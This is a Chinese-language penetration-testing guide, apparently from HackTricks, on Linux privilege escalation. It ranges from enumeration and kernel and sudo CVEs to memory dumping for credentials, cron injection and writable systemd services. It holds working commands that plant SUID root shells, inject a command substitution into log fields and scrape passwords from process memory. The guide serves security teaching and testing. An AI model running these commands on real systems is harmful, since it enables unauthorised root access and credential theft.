# Linux 提权

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Let's start gaining some knowledge of the OS running
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你在 `PATH` 变量内的任何文件夹上**有写权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中有有趣的信息、密码或 API 密钥吗？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，看看是否存在可用于提权的 exploit
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的 vulnerable kernel 列表以及一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。\
其他可以找到一些 **compiled exploits** 的站点： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从那个 web 中提取所有 vulnerable kernel versions，你可以这样做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
寻找 kernel exploits 时可使用的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)（在 victim 上执行，只检查 kernel 2.x 的 exploits）

始终要在 Google 中 **搜索 kernel version**，也许你的 kernel version 会直接出现在某个 kernel exploit 里，这样你就能确定这个 exploit 是有效的。

其他 kernel exploitation techniques：

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用这个 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许未授权本地用户在使用来自用户可控目录中的 `/etc/nsswitch.conf` 文件时，通过 sudo `--chroot` 选项将权限提升到 root。

这里有一个用于利用该 [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) 的 [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)。在运行 exploit 之前，请确保你的 `sudo` 版本存在漏洞，并且支持 `chroot` 功能。

更多信息请参考原始 [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 之前的 Sudo（受影响范围报告为：**1.8.8–1.9.17**）可以使用 `sudo -h <host>` 中**用户提供的 hostname** 来评估基于 host 的 sudoers 规则，而不是使用**真实 hostname**。如果 sudoers 在另一台 host 上授予了更宽泛的权限，你就可以在本地**伪造**那台 host。

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host is neither the current hostname nor `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
通过伪造允许的 host 来利用：
```bash
sudo -h devbox id
sudo -h devbox -i
```
如果伪造的名称解析会阻塞，把它添加到 `/etc/hosts`，或者使用一个已经出现在 logs/configs 中的 hostname，以避免 DNS lookups。

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **HTB 的 smasher2 box**，获取一个**示例**，了解这个漏洞可能如何被利用
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## 容器逃逸

如果你在一个 container 中，先查看下面的 container-security 部分，然后再转到对应 runtime 的 abuse 页面：


{{#ref}}
container-security/
{{#endref}}

## Drives

检查**哪些被挂载和未挂载**，位置在哪里，以及原因。如果有任何东西未挂载，你可以尝试将其挂载并检查是否有 private info
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了**任何编译器**。如果你需要使用某个 kernel exploit，这很有用，因为建议在你将要使用它的机器上编译它（或者在一台相似的机器上编译）。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装的包和服务版本**。也许存在某个旧的 Nagios 版本（例如），可以被利用来提权…\
建议手动检查那些更可疑的已安装软件版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有 SSH 访问机器的权限，你也可以使用 **openVAS** 来检查机器内部安装的过时且存在漏洞的软件。

> [!NOTE] > _请注意，这些命令会显示大量信息，其中大部分可能没什么用，因此建议使用 OpenVAS 或类似工具，来检查是否有任何已安装的软件版本会受到已知漏洞利用的影响_

## Processes

查看正在执行的 **what processes**，并检查是否有任何 process 拥有 **比它应有的更多权限**（也许是由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否存在正在运行的 [**electron/cef/chromium debuggers**](electron-cef-chromium-debugger-abuse.md)，你可能可以利用它来提升权限。**Linpeas** 会通过检查进程命令行中的 `--inspect` 参数来检测这些。\
另外，**检查你对进程二进制文件的权限**，也许你可以覆盖别人的文件。

### Cross-user parent-child chains

一个以**不同用户**身份运行的子进程，并不一定就是恶意的，但它是一个有用的**triage 信号**。某些转换是预期内的（`root` 启动服务用户、登录管理器创建会话进程），但异常的链路可能暴露包装器、debug helpers、persistence，或者薄弱的运行时信任边界。

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
如果你发现一个令人惊讶的链条，检查父进程命令行以及所有影响其行为的文件（`config`、`EnvironmentFile`、辅助脚本、工作目录、可写参数）。在几个真实的 privesc 路径中，子进程本身并不可写，但**父进程控制的 config** 或辅助链是可写的。

### Deleted executables and deleted-open files

运行时工件在删除后通常仍然可访问。 这对 privilege escalation 和从已经打开敏感文件的进程中恢复证据都很有用。

检查已删除的 executables：
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
如果 `/proc/<PID>/exe` 指向 `(deleted)`，说明该进程仍在从内存中运行旧的二进制映像。这是一个值得调查的强信号，因为：

- 已删除的可执行文件可能包含有趣的字符串或凭证
- 正在运行的进程可能仍然暴露有用的文件描述符
- 被删除的特权二进制文件可能表示最近的篡改或试图清理痕迹

全局收集已删除但仍打开的文件：
```bash
lsof +L1
```
如果你找到一个有趣的 descriptor，直接恢复它：
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
当一个进程仍然打开着已删除的 secret、script、database export 或 flag file 时，这一点尤其有价值。

### Process monitoring

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这对于识别频繁执行的 vulnerable processes，或者在满足一组条件时被执行的进程，非常有用。

### Process memory

服务器的一些服务会将 **credentials 以明文形式保存在内存中**。\
通常你需要 **root privileges** 才能读取属于其他用户的进程内存，因此这通常在你已经是 root 并且想发现更多 credentials 时更有用。\
不过，记住 **作为普通用户，你可以读取自己拥有的进程内存**。

> [!WARNING]
> 请注意，如今大多数机器 **默认不允许 ptrace**，这意味着你不能转储属于你非特权用户的其他进程。
>
> 文件 _**/proc/sys/kernel/yama/ptrace_scope**_ 控制 ptrace 的可访问性：
>
> - **kernel.yama.ptrace_scope = 0**：所有进程都可以被调试，只要它们具有相同的 uid。这是 ptracing 传统上的工作方式。
> - **kernel.yama.ptrace_scope = 1**：只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**：只有 admin 可以使用 ptrace，因为它需要 CAP_SYS_PTRACE capability。
> - **kernel.yama.ptrace_scope = 3**：没有进程可以被 ptrace 跟踪。一旦设置，需要重启才能再次启用 ptracing。

#### GDB

如果你可以访问（例如）FTP service 的内存，你就可以获取 Heap 并在其中搜索它的 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 会显示该进程的** 虚拟地址空间中内存是如何映射的；它也会显示每个已映射区域的**权限**。**mem** 伪文件**暴露进程本身的内存**。通过 **maps** 文件，我们知道哪些**内存区域是可读的**以及它们的偏移。我们利用这些信息来**定位到 mem 文件中并转储所有可读区域**到一个文件中。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统**物理**内存的访问，而不是虚拟内存。内核的虚拟地址空间可以使用 /dev/kmem 访问。\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是经典的 ProcDump 工具在 Linux 上的重新实现，原工具来自 Windows 的 Sysinternals 工具套件。在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取它
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

要转储 process memory，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root requirements，并转储你拥有的 process
- 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) 的 Script A.5（需要 root）

### Credentials from Process Memory

#### Manual example

如果你发现 authenticator process 正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 该进程（参见前面的章节以了解不同的进程内存 dump 方法），并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**，以及从一些**众所周知的文件**中提取。它需要 root 权限才能正常工作。

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)              | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) 以 root 运行 – 基于 web 的 scheduler privesc

如果一个 web “Crontab UI” 面板（alseambusher/crontab-ui）以 root 运行，并且只绑定到 loopback，你仍然可以通过 SSH local port-forwarding 访问它，并创建一个特权 job 来提权。

典型链
- 通过 `ss -ntlp` / `curl -v localhost:8000` 发现仅限 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm
- 在 operational artifacts 中查找凭据：
- 使用 `zip -P <password>` 的 backups/scripts
- 暴露 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` 的 systemd unit
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限 job 并立即运行（会生成 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- 不要以 root 运行 Crontab UI；使用专用用户并限制最小权限
- 绑定到 localhost，并额外通过 firewall/VPN 限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅 root 可读的 EnvironmentFile
- 为按需 job executions 启用 audit/logging



检查是否有任何 scheduled job 存在漏洞。也许你可以利用由 root 执行的 script（wildcard vuln? 能否修改 root 使用的 files？使用 symlinks？在 root 使用的目录中创建特定 files？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
如果使用了 `run-parts`，请检查哪些名称实际上会执行：
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
这可以避免误报。只有当你的 payload 文件名符合本地 `run-parts` 规则时，可写的周期性目录才有用。

### Cron path

例如，在 _/etc/crontab_ 中你可以找到 PATH：_PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（_注意用户 "user" 对 /home/user 有写权限_）

如果在这个 crontab 中，root 用户尝试执行某个命令或脚本而没有设置 path。例如：_\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### 使用带有通配符的脚本的 Cron（Wildcard Injection）

如果一个由 root 执行的脚本在某个命令中有 “**\***”，你可以利用这一点来做出意外的事情（比如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面有一个路径，比如** _**/some/path/\***_ **，那它就不脆弱（甚至** _**./\***_ **也不行）。**

阅读以下页面了解更多 wildcard 利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 `((...))`、`$((...))` 和 `let` 中会在 arithmetic evaluation 之前执行 parameter expansion 和 command substitution。若 root cron/parser 读取不受信任的日志字段并把它们传入 arithmetic context，攻击者就可以注入一个 `$(...)` command substitution，在 cron 运行时以 root 执行。

- 为什么可行：在 Bash 中，展开顺序是：parameter/variable expansion、command substitution、arithmetic expansion，然后才是 word splitting 和 pathname expansion。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值，会先被替换（从而运行命令），然后剩下的数字 `0` 会用于 arithmetic，因此脚本会继续执行而不会报错。

- 典型 vulnerable pattern：
```bash
#!/bin/bash
# 示例：解析日志并对来自日志的 count 字段做 "sum"
while IFS=',' read -r ts user count rest; do
# 如果日志由攻击者控制，那么 count 就是不受信任的
(( total += count ))     # 或者：let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方式：让攻击者可控的文本写入被解析的日志中，使这个看起来像数字的字段包含一个 command substitution，并以数字结尾。确保你的命令不会向 stdout 输出内容（或者把它重定向掉），这样 arithmetic 才会保持有效。
```bash
# 注入到日志中的字段值（例如通过一个精心构造、会被应用原样记录的 HTTP 请求）：
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# 当 root cron parser 计算 (( total += count )) 时，你的命令会以 root 运行。
```

### Cron script overwriting and symlink

如果你**可以修改一个由 root 执行的 cron script**，你就能非常轻松地获得 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果 root 执行的脚本使用了一个**你拥有完全访问权限的目录**，也许可以尝试删除那个文件夹，并**创建一个指向另一个文件夹的 symlink 目录**，让它服务于由你控制的脚本
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink 验证和更安全的文件处理

在审查按路径读取或写入文件的特权脚本/binaries 时，验证 links 是如何处理的：

- `stat()` 会跟随 symlink 并返回目标的 metadata。
- `lstat()` 返回 link 本身的 metadata。
- `readlink -f` 和 `namei -l` 有助于解析最终目标，并显示路径中每个组件的 permissions。
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
对于防御者/开发者，针对 symlink trick 的更安全模式包括：

- `O_EXCL` 配合 `O_CREAT`：如果路径已存在就失败（阻止攻击者预先创建 links/files）。
- `openat()`：相对于受信任的目录文件描述符进行操作。
- `mkstemp()`：以安全权限原子地创建临时文件。

### 带可写 payload 的自定义签名 cron binaries
Blue teams 有时会通过提取自定义 ELF section，并在以 root 执行前 grep 某个 vendor 字符串来“签名” cron 驱动的 binaries。如果那个 binary 是 group-writable 的（例如 `/opt/AV/periodic-checks/monitor`，归属 `root:devs 770`），并且你可以泄漏 signing material，那么你就可以伪造该 section 并劫持 cron task：

1. 使用 `pspy` 捕获验证流程。在 Era 中，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后执行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后再执行该文件。
2. 使用泄漏的 key/config（来自 `signing.zip`）重建预期的 certificate：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意替代版本（例如丢下一个 SUID bash，添加你的 SSH key），并把 certificate 嵌入到 `.text_sig` 里，这样 grep 就会通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 覆写被计划执行的 binary，同时保留 execute bits：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦那个简单的 signature check 成功，你的 payload 就会以 root 运行。

### 频繁的 cron jobs

你可以监控 processes，寻找每 1、2 或 5 分钟执行一次的 processes。也许你可以利用它们来提权。

例如，要 **每 0.1s 监控 1 分钟**，**按执行次数最少排序**，并删除执行次数最多的 commands，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (这将监控并列出每个启动的 process)。

### 保留 attacker-set mode bits 的 Root backups（pg_basebackup）

如果一个 root-owned cron 用 `pg_basebackup`（或任何 recursive copy）对一个你可写的 database directory 进行备份，你可以放置一个 **SUID/SGID binary**，它会在 backup output 中被再次复制为 **root:root**，并保留相同的 mode bits。

典型 discovery flow（作为低权限 DB user）：
- 使用 `pspy` 找到一个 root cron 在每分钟调用类似 `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` 的命令。
- 确认 source cluster（例如 `/var/lib/postgresql/14/main`）对你是可写的，并且 destination（`/opt/backups/current`）在 job 结束后变为 root-owned。

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
之所以可行，是因为 `pg_basebackup` 在复制 cluster 时会保留文件 mode bits；当由 root 调用时，目标文件会继承 **root ownership + 攻击者选择的 SUID/SGID**。任何类似的特权 backup/copy routine，只要保留 permissions 并写入可执行位置，都会存在漏洞。

### Invisible cron jobs

可以通过 **在注释后面放一个 carriage return**（不带 newline character）来创建一个 cronjob，而且这个 cron job 仍然会工作。示例（注意 carriage return 字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
为检测这种隐蔽入口，请使用能显示控制字符的工具检查 cron 文件：
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

检查你是否可以写入任何 `.service` 文件，如果可以，你 **可以修改它**，让它在服务 **启动**、**重启** 或 **停止** 时 **执行** 你的 **backdoor**（也许你需要等到机器重启）。\
例如，在 .service 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### Writable service binaries

请记住，如果你对由 services 执行的二进制文件有 **写权限**，你可以把它们改成 backdoors，这样当 services 被重新执行时，backdoors 也会被执行。

### systemd PATH - Relative Paths

你可以用以下方式查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在路径中的任何文件夹里 **write**，你可能就能够 **escalate privileges**。你需要检查 **relative paths** 是否被用于 service 配置文件，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, create an **可执行文件** with the **same name as the relative path binary** inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action (**Start**, **Stop**, **Reload**), your **backdoor will be executed** (unprivileged users usually cannot start/stop services but check if you can use `sudo -l`).

**通过 `man systemd.service` 了解更多关于 services 的信息。**

## **Timers**

**Timers** 是以 `**.timer**` 结尾的 systemd unit files，用于控制 `**.service**` files 或 events。**Timers** 可以作为 cron 的替代方案，因为它们内置支持 calendar time events 和 monotonic time events，并且可以异步运行。

你可以通过以下方式枚举所有 timers:
```bash
systemctl list-timers --all
```
### 可写 timers

如果你可以修改一个 timer，你就可以让它执行一些现有的 systemd.unit（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中，你可以读到这个 Unit 是什么：

> 当这个 timer 触发时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果没有指定，这个值默认是一个与 timer unit 同名的 service，除了后缀不同。（见上文。）建议被激活的 unit 名称和 timer unit 的名称保持相同，除了后缀。

因此，要滥用这个权限，你需要：

- 找到某个 systemd unit（比如一个 `.service`），它正在 **执行一个可写 binary**
- 找到某个 systemd unit，它正在 **执行一个相对路径**，并且你对 **systemd PATH** 拥有 **可写权限**（以便冒充那个 executable）

**通过 `man systemd.timer` 了解更多关于 timers 的信息。**

### **Enabling Timer**

要启用一个 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) 使得在 client-server models 中，同一台或不同机器上的 **process communication** 成为可能。它们使用标准的 Unix descriptor files 进行跨计算机通信，并通过 `.socket` 文件进行设置。

Sockets 可以使用 `.socket` 文件进行配置。

**使用 `man systemd.socket` 了解更多关于 sockets 的信息。** 在这个文件中，可以配置几个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但可以用一个总结来 **指示它将在哪里监听** socket（AF_UNIX socket 文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接收一个布尔参数。如果为 **true**，则会为每个传入连接 **spawn 一个 service instance**，并且只把连接 socket 传给它。如果为 **false**，所有监听 sockets 本身都会 **传递给已启动的 service unit**，并且只会为所有连接 spawn 一个 service unit。对于 datagram sockets 和 FIFOs，此值会被忽略，因为单个 service unit 会无条件处理所有传入流量。**默认值为 false**。出于性能原因，建议只以适合 `Accept=no` 的方式编写新的 daemons。
- `ExecStartPre`, `ExecStartPost`: 接收一个或多个命令行，它们会分别在监听 **sockets**/FIFOs **创建之前** 或 **之后** 执行。命令行的第一个 token 必须是绝对文件名，然后才是该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 额外的 **commands**，它们会分别在监听 **sockets**/FIFOs **关闭并移除之前** 或 **之后** 执行。
- `Service`: 指定要在 **incoming traffic** 时 **activate** 的 **service** unit 名称。这个设置只允许用于 Accept=no 的 sockets。默认是与 socket 同名的 service（后缀会被替换）。在大多数情况下，不需要使用这个选项。

### Writable .socket files

如果你找到一个可写的 `.socket` 文件，你可以在 `[Socket]` 部分开头 **添加** 类似这样的内容：`ExecStartPre=/home/kali/sys/backdoor`，这样 backdoor 会在 socket 创建之前执行。因此，你**很可能需要等待机器重启。**\
_注意，系统必须正在使用那个 socket 文件配置，否则 backdoor 不会被执行_

### Socket activation + writable unit path (create missing service)

另一个高影响的错误配置是：

- 一个 `Accept=no` 且 `Service=<name>.service` 的 socket unit
- 被引用的 service unit 缺失
- 攻击者可以写入 `/etc/systemd/system`（或其他 unit search path）

在这种情况下，攻击者可以创建 `<name>.service`，然后向 socket 发送流量，使 systemd 以 root 身份加载并执行新的 service。

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### 可写 sockets

如果你**识别出任何可写 socket**（_现在我们说的是 Unix Sockets，而不是配置 `.socket` 文件_），那么**你可以与**该 socket 通信，并且也许能利用一个漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
